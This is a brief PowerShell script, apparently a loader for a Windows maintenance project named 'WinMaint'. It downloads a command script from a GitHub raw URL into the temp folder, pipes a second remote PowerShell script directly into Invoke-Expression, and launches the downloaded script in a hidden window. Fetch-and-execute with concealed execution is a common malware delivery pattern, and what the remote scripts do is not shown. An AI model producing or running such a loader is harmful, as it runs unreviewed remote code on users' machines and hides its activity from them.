$cmdScriptUrl = "https://raw.githubusercontent.com/Abdullah-Albanna/WinMaint/main/MonitorScript.cmd"
$cmdScriptPath = "$env:TEMP\MonitorScript.cmd"
Invoke-WebRequest -Uri $cmdScriptUrl -OutFile $cmdScriptPath
iwr -useb https://raw.githubusercontent.com/Abdullah-Albanna/WinMaint/main/MainScript.ps1 | iex
Start-Process cmd.exe -ArgumentList "/c $cmdScriptPath" -WindowStyle Hidden
